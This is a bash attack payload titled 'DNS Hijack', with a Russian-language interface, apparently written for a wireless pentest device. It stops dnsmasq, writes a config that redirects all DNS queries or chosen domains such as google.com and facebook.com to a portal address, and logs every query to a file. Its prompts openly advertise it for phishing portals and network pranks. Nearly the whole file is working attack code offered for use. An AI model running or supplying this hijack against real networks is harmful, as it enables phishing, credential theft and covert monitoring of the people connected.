#!/bin/bash
# Title: DNS Hijack
# Author: bad-antics
# Description: Перенаправление DNS-запросов для захвата порталов
# Category: nullsec/attack

# FIX: PATH для UI и fallback-функции
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH

command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Нажмите Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ОШИБКА: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Готово"; }
command -v TEXT_PICKER >/dev/null 2>&1 || TEXT_PICKER() { echo "$1"; read -p "Введите значение: " val; echo "$val"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Выбор (по умолчанию $2): " choice; echo "${choice:-$2}"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Подтвердить? (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }

# Определяем $DUCKYSCRIPT_USER_CONFIRMED если не задано
[ -z "$DUCKYSCRIPT_USER_CONFIRMED" ] && DUCKYSCRIPT_USER_CONFIRMED="0"

# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE)
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "ПЕРЕХВАТ DNS

Перехват DNS-запросов
и перенаправление на
пользовательские адреса.

Идеально для:
- Фишинговых порталов
- Анализа трафика
- Сетевых розыгрышей

Нажмите OK для продолжения."

INTERFACE="$IFACE"

PROMPT "РЕЖИМ ПЕРЕХВАТА:

1. Весь трафик → Портал
2. Определённые домены
3. Пользовательские перенаправления

Выберите режим."

HIJACK_MODE=$(NUMBER_PICKER "Режим (1-3):" 1)

PORTAL_IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
PORTAL_IP=${PORTAL_IP:-192.168.1.1}

case $HIJACK_MODE in
    1) # Весь трафик
        DNS_ENTRIES="address=/#/$PORTAL_IP"
        PROMPT "РЕЖИМ ВСЕГО ТРАФИКА

Каждый DNS-запрос будет
перенаправлен на портал:
$PORTAL_IP

Нажмите OK для продолжения."
        ;;
        
    2) # Определённые домены
        PROMPT "ПЕРЕХВАТ ДОМЕНОВ

Введите домены для перехвата
через пробел.

Пример: google.com facebook.com twitter.com"
        
        DOMAINS=$(TEXT_PICKER "Домены:" "google.com facebook.com")
        
        DNS_ENTRIES=""
        for DOMAIN in $DOMAINS; do
            DNS_ENTRIES="${DNS_ENTRIES}address=/${DOMAIN}/${PORTAL_IP}\n"
        done
        ;;
        
    3) # Пользовательские перенаправления
        PROMPT "ПОЛЬЗОВАТЕЛЬСКИЕ ПЕРЕНАПРАВЛЕНИЯ

Будет запрошен каждый
домен и его адрес.

Нажмите OK для настройки."
        
        DNS_ENTRIES=""
        for i in 1 2 3; do
            DOMAIN=$(TEXT_PICKER "Домен $i:" "")
            if [ -n "$DOMAIN" ]; then
                TARGET=$(TEXT_PICKER "Перенаправить на IP:" "$PORTAL_IP")
                DNS_ENTRIES="${DNS_ENTRIES}address=/${DOMAIN}/${TARGET}\n"
            fi
        done
        ;;
esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ ПЕРЕХВАТ DNS?

Это перехватит DNS-трафик.

Убедитесь, что портал
запущен.

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Запуск перехвата DNS..."
SPINNER_START "Перехват DNS..."

# Остановить существующий dnsmasq
killall dnsmasq 2>/dev/null

# Создать конфигурацию dnsmasq
mkdir -p /mmc/nullsec
cat > /tmp/dnsmasq_hijack.conf << DNSMASQ_EOF
interface=$INTERFACE
no-dhcp-interface=$INTERFACE
bind-interfaces
no-resolv
$(echo -e "$DNS_ENTRIES")
DNSMASQ_EOF

# Настроить интерфейс
ifconfig $INTERFACE $PORTAL_IP netmask 255.255.255.0 up

# Запустить перехваченный DNS
dnsmasq -C /tmp/dnsmasq_hijack.conf --log-queries --log-facility=/mmc/nullsec/dns_log.txt &
DNSMASQ_PID=$!

PROMPT "ПЕРЕХВАТ DNS АКТИВЕН!

IP портала: $PORTAL_IP
Режим: $HIJACK_MODE

Запросы записываются в:
/mmc/nullsec/dns_log.txt

Нажмите OK для просмотра..."

# Цикл мониторинга
DURATION=$(NUMBER_PICKER "Время работы (мин):" 10)
sleep $((DURATION * 60))

SPINNER_STOP

# Очистка
kill $DNSMASQ_PID 2>/dev/null
rm /tmp/dnsmasq_hijack.conf 2>/dev/null

QUERY_COUNT=$(wc -l < /mmc/nullsec/dns_log.txt 2>/dev/null || echo 0)

PROMPT "ПЕРЕХВАТ DNS ОСТАНОВЛЕН

Длительность: ${DURATION} мин
Записано запросов: $QUERY_COUNT

Проверьте dns_log.txt
для захваченных запросов.

Нажмите OK для выхода."


